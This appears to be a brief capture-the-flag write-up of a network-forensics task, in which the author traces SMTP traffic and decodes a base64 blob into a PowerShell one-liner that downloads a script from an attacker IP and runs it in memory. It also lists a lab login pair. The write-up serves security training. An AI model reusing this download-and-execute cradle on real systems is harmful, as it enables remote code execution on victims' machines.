
filterd for smtp and followed a tcp stream i found a base64 at the end that had a powershell command one liner IEX(New-Object Net.WebClient).downloadString('http://10.0.2.45/radius.ps1') The command creates a Net.WebClient(used to send and receive data using http). The command downloads the contents of radius.ps1 being served in attacker's ip 10.0.2.45. It executes the downloaded data in memory using IEX(Invoke Expression)-the script is never saved in disk it executes after being downloaded.

tom.dom@eventhorizon.thm:password dom.mark@eventhorizon.thm
<img width="1919" height="489" alt="image" src="https://github.com/user-attachments/assets/fa3687c9-0a9f-4761-b305-4cd395e6887e" />
<img width="1275" height="797" alt="image" src="https://github.com/user-attachments/assets/86f88982-cf9f-4a81-9389-3a5c078a3c25" />
<img width="1093" height="771" alt="image" src="https://github.com/user-attachments/assets/ebc13801-1254-48ca-8471-907fa6cdc7b6" />


